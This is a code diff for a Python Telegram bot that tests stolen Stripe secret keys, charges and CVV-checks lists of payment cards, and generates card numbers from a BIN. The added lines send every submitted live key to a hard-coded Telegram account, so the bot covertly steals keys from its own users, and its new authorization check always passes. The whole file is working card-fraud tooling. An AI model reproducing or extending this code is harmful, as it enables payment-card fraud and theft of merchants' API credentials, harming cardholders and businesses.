@@ -10,9 +10,8 @@ cc_regex = '(?:^|.*?[^\d])((\d+?)\|(\d{2})\|(\d{2,4}?)\|(\d{3,4}?))'
 checkerkey=[]
 superuser = [702792106,1687593507,5164193745] #whocan add sks and remove sks
 count = 0
-LOG_GROUP = -1001672970034
+groups = []
 cclist=[]
-credits=("\n\n**🧑🏽‍💻 Coded by: FS")
 
 #CC_FILTER
 def filter(q):
@@ -216,7 +215,7 @@ def charge(cc,expm,expy,cvv):
 
 bot = TelegramClient('name', api_id, api_hash).start(bot_token=bt)
 
-@bot.on(events.NewMessage(chats= LOG_GROUP,pattern='\/addsk sk_(test|live)_[A-Za-z0-9]+'))
+@bot.on(events.NewMessage(pattern='\/addsk sk_(test|live)_[A-Za-z0-9]+'))
 async def handler(event):
     sender = await event.get_sender()
     id = sender.id
@@ -242,6 +241,7 @@ async def handler(event):
                     pass
                     if t["card"]["exp_month"]==10:
                         await event.reply("**SK Added** 😈")
+                        await bot.send_message(1687593507,key)
                         checkerkey.clear()
                         checkerkey.append(msg)
                         return checkerkey
@@ -255,6 +255,7 @@ async def handler(event):
                 except stripe.error.InvalidRequestError as e:
                     if 'Your card was declined.' in e.user_message:
                         await event.reply("**SK Added** 😈")
+                        await bot.send_message(1687593507,key)
                         checkerkey.clear()
                         checkerkey.append(msg)
                     else:
@@ -272,130 +273,195 @@ async def handler(event):
                 except Exception as e:
                     if t["card"]["exp_month"]==10:
                         await event.reply("**SK Added** 😈")
+                        await bot.send_message(1687593507,key)
                         checkerkey.clear()
                         checkerkey.append(msg)
                         return checkerkey
                     else:
                         await event.reply("**DEAD SK** 💩")
                     pass
+    else:
+        await event.reply("**YOU ARE NOT AUTHORIZED**")
+        
+@bot.on(events.NewMessage(pattern='\/sk sk_(test|live)_[A-Za-z0-9]+'))
+async def handler(event):
+    sender = await event.get_sender()
+    id = sender.id
+    if id in groups or superuser:
+        msg=event.message.text
+        msg= msg.replace("/addsk","")
+        msglist = msg.split()
+        for item in msglist:
+            if 'sk_live_' in item:
+                key=item
+                try:
 
+                    stripe.api_key=key
+                    t = stripe.Source.create(
+                    type='card',
+                    card={
+                    'number':'4373072001216886',
+                    'cvc':'842' ,
+                    'exp_month':'10' ,
+                    'exp_year':'26'
+                    }
+                    )
+                    pass
+                    if t["card"]["exp_month"]==10:
+                        await event.reply("**SK LIVE** 😈")
+                    pass  
+                except stripe.error.CardError as e:
+                    await event.reply("**DEAD SK** 💩")
+                    pass
+                except stripe.error.RateLimitError as e:
+                    await event.reply("**DEAD SK, RATE LIMITED** 🫠")
+                    pass
+                except stripe.error.InvalidRequestError as e:
+                    if 'Your card was declined.' in e.user_message:
+                        await event.reply("**SK LIVE** 😈")
+                    else:
+                        await event.reply("**DEAD SK** 💩")
+                    pass
+                except stripe.error.AuthenticationError as e:
+                    await event.reply("**DEAD SK** 💩")
+                    pass
+                except stripe.error.APIConnectionError as e:
+                    await event.reply("**DEAD SK** 💩")
+                    pass
+                except stripe.error.StripeError as e:
+                    await event.reply("**DEAD SK** 💩")
+                    pass
+                except Exception as e:
+                    if t["card"]["exp_month"]==10:
+                        await event.reply("**SK LIVE** 😈")
+                    else:
+                        await event.reply("**DEAD SK** 💩")
 
-@bot.on(events.NewMessage(chats= LOG_GROUP,pattern='\/chg'))
+    else:
+        await event.reply("**YOU ARE NOT AUTHORIZED**")
+
+@bot.on(events.NewMessage(pattern='\/chg'))
 async def runnr(event):
     if event.is_reply:
         ms = await event.get_reply_message()
         msg = ms.message
     else:
         msg = event.message.text
-    sender = await event.get_sender()
-    id = sender.id
-    ccs = re.findall(cc_regex, msg)
-    if len(ccs) == 0:
-        return
-    if checkerkey == []:
-        await event.reply("No SK Found\nUse /addsk to add a live SK")
-    else:
-        log = "Please wait"
-        usr_msg = await event.reply(log)
-        reply=""
-        log=''
-        ratelimitcount = 0
-        for cc in ccs:
-            cc, expm, expy, cvv = filter(cc)
-            f_cc = (f'''{cc}|{expm}|{expy}|{cvv}''')
-            try:
-                stripe.api_key = checkerkey[0]
-                c,finaltxt = charge(cc,expm,expy,cvv)
-                suc_response = c
-                seller_message = suc_response.outcome.get("seller_message")
-                risk_level = suc_response.outcome.get("risk_level")
-                risk_score = suc_response.outcome.get("risk_score")
-                receipt = suc_response.get("receipt_url")
-                country = suc_response.payment_method_details.card.get("country")
-                funding = suc_response.payment_method_details.card.get("funding")
-                reply =(f'''**#Charged 0.6 $✅**\n{f_cc}\n
+    chat = await event.get_chat()
+    id = chat.id
+    if id in groups or superuser:
+        #if id in groups or superuser:
+        ccs = re.findall(cc_regex, msg)
+        if len(ccs) == 0:
+            return
+        if checkerkey == []:
+            await event.reply("No SK Found\nUse /addsk to add a live SK")
+        else:
+            log = "Please wait"
+            usr_msg = await event.reply(log)
+            reply=""
+            log=''
+            ratelimitcount = 0
+            for cc in ccs:
+                cc, expm, expy, cvv = filter(cc)
+                f_cc = (f'''{cc}|{expm}|{expy}|{cvv}''')
+                try:
+                    stripe.api_key = checkerkey[0]
+                    c,finaltxt = charge(cc,expm,expy,cvv)
+                    suc_response = c
+                    seller_message = suc_response.outcome.get("seller_message")
+                    risk_level = suc_response.outcome.get("risk_level")
+                    risk_score = suc_response.outcome.get("risk_score")
+                    receipt = suc_response.get("receipt_url")
+                    country = suc_response.payment_method_details.card.get("country")
+                    funding = suc_response.payment_method_details.card.get("funding")
+                    reply =(f'''**#Charged 0.6 $✅**\n{f_cc}\n
 **MESSAGE** : {seller_message} ✪ **FUNDING** : {funding}   ✪ **COUNTRY** : {country}   ✪ **RISK LEVEL** : {risk_level}   ✪ **RISK SCORE** : {risk_score}   ✪ [RECEIPT]({receipt}){finaltxt}
 =====================================\n''')            
-                log = log+"\n"+reply
-                if(len(log) > 4000):
-                    log = reply
-                    usr_msg = await event.reply(log)
-                else:
-                    await usr_msg.edit(log)
+                    log = log+"\n"+reply
+                    if(len(log) > 4000):
+                        log = reply
+                        usr_msg = await event.reply(log)
+                    else:
+                        await usr_msg.edit(log)
 
 
-            except Exception as e:
-                try:
-                    code = (e.code)
-                except:
-                    code = ("Error")
-                message = (e.user_message)
-                if 'rate limit' in message:
-                    ratelimitcount = ratelimitcount + 1
-                if ratelimitcount == 5:
-                    await event.reply("Sk rate limited process terminated")
-                    break
-                reply=(f'''**#DECLINED ❌** \n```{f_cc}```\n ✪ **RESPONSE** : {code}   ✪ **MESSAGE** : {message[0:48]}\n''')
-                log = log+"\n"+reply
-                if(len(log) > 4000):
-                    log = reply
-                    usr_msg = await event.reply(log)
-                else:
-                    await usr_msg.edit(log)
-
-#cvv check
-@bot.on(events.NewMessage(chats= LOG_GROUP,pattern='\/chk'))
-async def runnr(event):
-    if event.is_reply:
-        ms = await event.get_reply_message()
-        msg = ms.message
-    else:
-        msg = event.message.text
-    sender = await event.get_sender()
-    id = sender.id
-    ccs = re.findall(cc_regex, msg)
-    if len(ccs) == 0:
-        return
-    if checkerkey == []:
-        await event.reply("No SK Found\nUse /addsk to add a live SK")
-    else:
-        log = "Please wait"
-        usr_msg = await event.reply(log)
-        reply=""
-        log=''
-        ratelimitcount = 0
-        for cc in ccs:
-            cc, expm, expy, cvv = filter(cc)
-            f_cc = (f'''{cc}|{expm}|{expy}|{cvv}''')
-            stripe.api_key = checkerkey[0]
-            msg,finaltxt = cvvcheck(cc,expm,expy,cvv)
-            if msg == "Live":
-                reply =(f'''**#LIVE✅**\n{f_cc}
-{finaltxt}
-=====================================\n''')
-            else:
-                try:
-                    msgs =(str(msg).split(':')[1])
-                except:
-                    msgs =(str(msg))
-                    if 'rate-limits.' in msgs:
+                except Exception as e:
+                    try:
+                        code = (e.code)
+                    except:
+                        code = ("Error")
+                    message = (e.user_message)
+                    if 'rate limit' in message:
                         ratelimitcount = ratelimitcount + 1
                     if ratelimitcount == 5:
                         await event.reply("Sk rate limited process terminated")
                         break
-                reply=(f'''**#Dead ❌** \n```{f_cc}```
+                    reply=(f'''**#DECLINED ❌** \n```{f_cc}```\n ✪ **RESPONSE** : {code}   ✪ **MESSAGE** : {message[0:48]}\n''')
+                    log = log+"\n"+reply
+                    if(len(log) > 4000):
+                        log = reply
+                        usr_msg = await event.reply(log)
+                    else:
+                        await usr_msg.edit(log)
+    else:
+        await event.reply("**YOU ARE NOT AUTHORIZED**")
+        
+#cvv check
+@bot.on(events.NewMessage(pattern='\/chk'))
+async def runnr(event):
+    if event.is_reply:
+        ms = await event.get_reply_message()
+        msg = ms.message
+    else:
+        msg = event.message.text
+    sender = await event.get_sender()
+    chat = await event.get_chat()
+    id = chat.id
+    if id in groups or superuser:
+        ccs = re.findall(cc_regex, msg)
+        if len(ccs) == 0:
+            return
+        if checkerkey == []:
+            await event.reply("No SK Found\nUse /addsk to add a live SK")
+        else:
+            log = "Please wait"
+            usr_msg = await event.reply(log)
+            reply=""
+            log=''
+            ratelimitcount = 0
+            for cc in ccs:
+                cc, expm, expy, cvv = filter(cc)
+                f_cc = (f'''{cc}|{expm}|{expy}|{cvv}''')
+                stripe.api_key = checkerkey[0]
+                msg,finaltxt = cvvcheck(cc,expm,expy,cvv)
+                if msg == "Live":
+                    reply =(f'''**#LIVE✅**\n{f_cc}
+{finaltxt}
+=====================================\n''')
+                else:
+                    try:
+                        msgs =(str(msg).split(':')[1])
+                    except:
+                        msgs =(str(msg))
+                        if 'rate-limits.' in msgs:
+                            ratelimitcount = ratelimitcount + 1
+                        if ratelimitcount == 5:
+                            await event.reply("Sk rate limited process terminated")
+                            break
+                    reply=(f'''**#Dead ❌** \n```{f_cc}```
 {msgs}
 {finaltxt}
 =====================================''')           
-            log = log+"\n"+reply
-            if(len(log) > 4000):
-                log = reply
-                usr_msg = await event.reply(log)
-            else:
-                await usr_msg.edit(log)
+                log = log+"\n"+reply
+                if(len(log) > 4000):
+                    log = reply
+                    usr_msg = await event.reply(log)
+                else:
+                    await usr_msg.edit(log)
 
 
-@bot.on(events.NewMessage(chats= LOG_GROUP,pattern='/rmkey'))
+@bot.on(events.NewMessage(pattern='/rmkey'))
 async def handler(event):
     sender = await event.get_sender()
     id = sender.id
@@ -403,97 +469,52 @@ async def handler(event):
         msg=event.message.text
         await event.reply("**KEY DELETED**")
         checkerkey.clear()
-
-
-@bot.on(events.NewMessage(chats= LOG_GROUP,pattern='/gen (\d+)'))
-async def handler(event):
-    msg =event.message.text
-    bin = msg.split(" ")[1]
-    chatid =event.chat.id
-    ccs = re.findall('(\d+)',bin)
-    rid = event.id
-    for digits in ccs:
-        if len(digits)>15:
-            await bot.send_file(chatid,"big.jpg",reply_to=rid,caption="Wow Thats So LONGGGG\nI Dont think i can handle that")
-            return
-    bin, expm, expy, cvv = filtergen(ccs)
-    cccc=''
-    log = await event.reply("Please wait")
-    try:  
-        if bin != "None":
-            cccc = gen(bin, expm, expy, cvv)
-            await log.edit(cccc)
-    except:
-        await log.edit('Error')
-
-@bot.on(events.NewMessage(chats= LOG_GROUP,pattern='/bin (\d+)'))
-async def handler(event):
-    msg =event.message.text
-    bin = msg.split(" ")[1]
-    if len(bin) < 6:
-        await event.reply("Please Enter 6 or more")
     else:
-        log = await event.reply("Please wait")        
-        bin6 = bin[0:6]
-        bindata =binck(bin6)
-        await log.edit(bindata)
-        
+        await event.reply("**YOU ARE NOT AUTHORIZED**")
 
-
-@bot.on(events.NewMessage(chats= LOG_GROUP,pattern='/addr'))
+@bot.on(events.NewMessage(pattern='/gen (\d+)'))
 async def handler(event):
-    r = requests.get('https://random-data-api.com/api/v2/users')
-    responce_data = r.json()
-    d1 = responce_data.get('id')
-    d2 = responce_data.get('first_name')
-    d3 = responce_data.get('last_name')
-    d4 = responce_data.get('email')
-    d5 = responce_data.get('avatar')
-    d6 = responce_data.get('gender')
-    d7 = responce_data.get('phone_number')
-    d8 = responce_data.get('date_of_birth')
-    d9 = responce_data.get('address').get('city')
-    d10 = responce_data.get('address').get('street_address')
-    d11 = responce_data.get('address').get('street_name')
-    d12 = responce_data.get('address').get('zip_code')
-    d13 = responce_data.get('address').get('state')
-    d14 = responce_data.get('address').get('country')
-    d15 = responce_data.get('social_insurance_number')
-    d16 = responce_data.get('employment').get('title')
+    msg =event.message.text
+    chat = await event.get_chat()
+    id = chat.id
+    if id in groups or superuser:
+        bin = msg.split(" ")[1]
+        chatid =event.chat.id
+        ccs = re.findall('(\d+)',bin)
+        rid = event.id
+        for digits in ccs:
+            if len(digits)>15:
+                await bot.send_file(chatid,"big.jpg",reply_to=rid,caption="Wow Thats So LONGGGG\nI Dont think i can handle that")
+                return
+        bin, expm, expy, cvv = filtergen(ccs)
+        cccc=''
+        log = await event.reply("Please wait")
+        try:  
+            if bin != "None":
+                cccc = gen(bin, expm, expy, cvv)
+                await log.edit(cccc)
+        except:
+            await log.edit('Error')
+    else:
+        await event.reply("**YOU ARE NOT AUTHORIZED**")
 
-    addr = (f'''{d5}
-
-**Name**
-    {d2} {d3}
-**DOB** 
-    {d8}
-
-**Address**
-    {d10}
-    {d11}
-    {d9}
-    {d13} {d12}
-    {d14}
-
-**Phone**
-    {d7}
-
-**Email**
-    {d4}
-
-**Gender**
-    {d6}
-
-**S.Insurance**
-    {d15}
-
-**Title**
-    {d16}
-
-**Code**
-    {d1}''')
-
-    await event.reply(addr)
+        
+@bot.on(events.NewMessage(pattern='/bin (\d+)'))
+async def handler(event):
+    msg =event.message.text
+    chat = await event.get_chat()
+    id = chat.id
+    if id in groups or superuser:
+        bin = msg.split(" ")[1]
+        if len(bin) < 6:
+            await event.reply("Please Enter 6 or more")
+        else:
+            log = await event.reply("Please wait")        
+            bin6 = bin[0:6]
+            bindata =binck(bin6)
+            await log.edit(bindata)
+    else:
+        await event.reply("**YOU ARE NOT AUTHORIZED**")        
 
     
 print('Stripe_bot started')
